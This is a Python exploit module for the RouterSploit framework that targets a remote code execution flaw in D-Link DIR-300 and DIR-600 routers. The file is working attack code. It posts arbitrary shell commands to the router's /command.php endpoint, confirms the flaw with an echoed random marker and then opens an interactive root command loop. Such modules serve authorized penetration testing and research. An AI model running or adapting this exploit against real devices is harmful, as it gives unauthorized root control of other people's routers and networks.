from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "D-Link DIR-300 & DIR-600 RCE",
        "description": "Module exploits D-Link DIR-300, DIR-600 Remote Code Execution vulnerability "
                       "which allows executing command on operating system level with root privileges.",
        "authors": (
            "Michael Messner <devnull[at]s3cur1ty.de>",  # vulnerability discovery
            "Marcin Bury <marcin.bury[at]reverse-shell.com>",  # routersploit module
        ),
        "references": (
            "http://www.dlink.com/uk/en/home-solutions/connect/routers/dir-600-wireless-n-150-home-router",
            "http://www.s3cur1ty.de/home-network-horror-days",
            "http://www.s3cur1ty.de/m1adv2013-003",
        ),
        "devices": (
            "D-Link DIR 300",
            "D-Link DIR 600",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            shell(self)
        else:
            print_error("Target is not vulnerable")

    def execute(self, cmd):
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        data = "cmd={}".format(cmd)

        response = self.http_request(
            method="POST",
            path="/command.php",
            headers=headers,
            data=data
        )
        if response is None:
            return ""

        return response.text.strip()

    @mute
    def check(self):
        mark = utils.random_text(32)
        cmd = "echo {}".format(mark)

        response = self.execute(cmd)

        if mark in response:
            return True  # target is vulnerable

        return False  # target is not vulnerable
